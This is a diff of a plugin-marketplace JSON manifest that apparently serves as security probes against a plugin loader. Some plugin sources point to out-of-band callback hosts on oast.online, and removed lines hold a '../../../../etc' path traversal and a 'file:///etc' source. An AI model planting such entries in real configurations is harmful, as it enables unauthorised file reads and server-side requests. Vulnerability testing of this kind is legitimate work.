@@ -1,7 +1,7 @@
 {
-  "name": "anf573",
+  "name": "anf573b",
   "owner": {
-    "name": "anf573"
+    "name": "anf573b"
   },
   "plugins": [
     {
@@ -9,46 +9,31 @@
       "source": "./anf573-local"
     },
     {
-      "name": "r1https",
-      "source": {
-        "source": "git-subdir",
-        "url": "https://anf573-https.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git",
-        "path": "src",
-        "ref": "main"
-      }
-    },
-    {
-      "name": "r2url",
-      "source": {
-        "source": "url",
-        "url": "https://anf573-urlvar.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git"
-      }
-    },
-    {
-      "name": "r3trav",
+      "name": "anf573b-meugit",
       "source": {
         "source": "git-subdir",
         "url": "https://github.com/LucasLeal871/anf490-test.git",
-        "path": "../../../../etc",
-        "ref": "main"
+        "path": "anf573-local",
+        "ref": "main",
+        "sha": "cad5309ab64faae709440385d0e7441d3e3e61d1"
       }
     },
     {
-      "name": "r4file",
+      "name": "anf573b-meuhost",
       "source": {
         "source": "git-subdir",
-        "url": "file:///etc",
-        "path": ".",
-        "ref": "main"
+        "url": "https://anf573b-host.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git",
+        "path": "anf573-local",
+        "ref": "main",
+        "sha": "cad5309ab64faae709440385d0e7441d3e3e61d1"
       }
     },
     {
-      "name": "r5gitp",
+      "name": "anf573b-urlvar",
       "source": {
-        "source": "git-subdir",
-        "url": "git://anf573-gitproto.db6qie10ga51sb1ne1k09bkgroutgwxxn.oast.online/r.git",
-        "path": "src",
-        "ref": "main"
+        "source": "url",
+        "url": "https://github.com/LucasLeal871/anf490-test.git",
+        "sha": "cad5309ab64faae709440385d0e7441d3e3e61d1"
       }
     }
   ]
